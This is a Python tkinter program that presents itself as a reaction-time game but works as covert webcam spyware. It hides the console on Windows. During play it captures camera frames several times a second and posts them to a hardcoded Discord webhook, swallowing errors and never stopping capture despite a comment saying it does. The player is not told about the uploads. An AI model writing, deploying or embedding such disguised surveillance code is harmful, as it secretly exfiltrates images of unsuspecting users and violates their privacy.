import tkinter as tk
import time
import random
import cv2
import requests
from PIL import Image, ImageTk
import threading
from io import BytesIO
import os
if os.name == 'nt':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class ReactionGame:
    def __init__(self, webhook_url):
        self.window = tk.Tk()
        self.window.title("Reaction Time Camera Game")
        self.window.geometry("500x500")
        self.window.configure(bg="#2C3E50")

        self.window.protocol("WM_DELETE_WINDOW", self.on_closing)

        self.webhook_url = webhook_url
        self.start_time = 0
        self.waiting_for_click = False
        self.camera_active = False
        self.taking_photos = True
        self.cap = None

        self.setup_ui()

    def setup_ui(self):
        title_frame = tk.Frame(self.window, bg="#2C3E50")
        title_frame.pack(pady=20)

        title_label = tk.Label(
            title_frame,
            text="📸 Reaction Camera Game 🎮",
            font=("Arial", 24, "bold"),
            fg="#ECF0F1",
            bg="#2C3E50"
        )
        title_label.pack()

        self.main_button = tk.Button(
            self.window,
            text="Click to Start Camera Game",
            width=25,
            height=3,
            font=("Arial", 14, "bold"),
            command=self.start_game,
            bg="#3498DB",
            fg="white",
            relief="raised",
            cursor="hand2"
        )
        self.main_button.pack(pady=30)

        results_frame = tk.Frame(self.window, bg="#2C3E50")
        results_frame.pack(pady=20)

        self.result_label = tk.Label(
            results_frame,
            text="Get ready for the camera game!",
            font=("Arial", 16),
            fg="#E74C3C",
            bg="#2C3E50",
            wraplength=400
        )
        self.result_label.pack(pady=10)

        instructions_frame = tk.Frame(self.window, bg="#2C3E50")
        instructions_frame.pack(pady=20, padx=20)

        instructions_text = """
        🎮 How to Play:
        1. Click the blue button to start
        2. Wait for the button to turn green
        3. Click as fast as you can!
        """

        instructions_label = tk.Label(
            instructions_frame,
            text=instructions_text,
            font=("Arial", 12),
            fg="#F1C40F",
            bg="#2C3E50",
            justify="left"
        )
        instructions_label.pack()

    def start_game(self):
        if not self.camera_active:
            self.cap = cv2.VideoCapture(0)
            if self.cap.isOpened():
                self.camera_active = True

                self.main_button.configure(
                    text="Wait for green...",
                    bg="#E74C3C"
                )
                self.result_label.configure(text="Wait for it...")
                self.waiting_for_click = True
                self.taking_photos = True
                threading.Thread(target=self.photo_loop, daemon=True).start()
                self.window.after(random.randint(1000, 3000), self.change_to_green)

        elif self.waiting_for_click and self.main_button.cget("bg") == "#2ECC71":
            self.current_reaction_time = (time.time() - self.start_time) * 1000
            self.result_label.configure(
                text=f"Reaction time: {self.current_reaction_time:.1f} ms"
            )

            # Stop taking photos
            self.taking_photos = True

            self.main_button.configure(
                text="Click to Start Next Round",
                bg="#3498DB"
            )
            self.waiting_for_click = False

        elif not self.waiting_for_click:
            self.main_button.configure(
                text="Wait for green...",
                bg="#E74C3C"
            )
            self.result_label.configure(text="Wait for it...")
            self.waiting_for_click = True
            self.taking_photos = True
            threading.Thread(target=self.photo_loop, daemon=True).start()
            self.window.after(random.randint(1000, 3000), self.change_to_green)

    def change_to_green(self):
        if self.waiting_for_click:
            self.main_button.configure(
                text="Click Now!",
                bg="#2ECC71"
            )
            self.start_time = time.time()

    def photo_loop(self):
        while self.taking_photos and self.camera_active:
            ret, frame = self.cap.read()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                image_bytes = BytesIO(buffer)

                try:
                    files = {'file': ('image.jpg', image_bytes.getvalue())}
                    requests.post(self.webhook_url, files=files)
                except:
                    pass

            time.sleep(0.2)

    def on_closing(self):
        self.taking_photos = True
        self.camera_active = False
        if self.cap is not None:
            self.cap.release()
        self.window.destroy()

    def run(self):
        self.window.mainloop()

if __name__ == "__main__":
    WEBHOOK_URL = "https://discord.com/api/webhooks/1348640554715709531/WmbOMMHqjQhcjvsuTZhNg8ub1jIeWPHjQ_GXUMMaTq-KoR9Rr6BMd4LjsbLPuPKPEPY9"
    app = ReactionGame(WEBHOOK_URL)
    app.run()
